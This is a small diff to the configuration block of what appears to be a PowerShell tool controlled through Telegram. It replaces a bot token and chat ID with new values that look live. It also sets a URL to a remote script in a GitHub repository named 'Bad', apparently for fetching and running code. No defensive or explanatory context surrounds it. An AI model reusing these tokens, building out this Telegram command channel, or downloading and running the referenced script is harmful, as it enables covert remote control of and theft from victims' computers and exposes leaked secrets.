@@ -9,8 +9,8 @@
 ## CONFIG ##
 ############
 
-$BotToken = "1986077986:AAFPe9UPdKmmFXpkCh5h1FTgQpzskVbly3Q"
-$ChatID = '-422833003'
+$BotToken = "5562952223:AAGrlolQOAErVwGEux6bDE2ALfn3vP4U5cE"
+$ChatID = '-606827403'
 $githubScript = 'https://raw.githubusercontent.com/cr1pt0-med/Bad/main/pc.ps1'
 
 
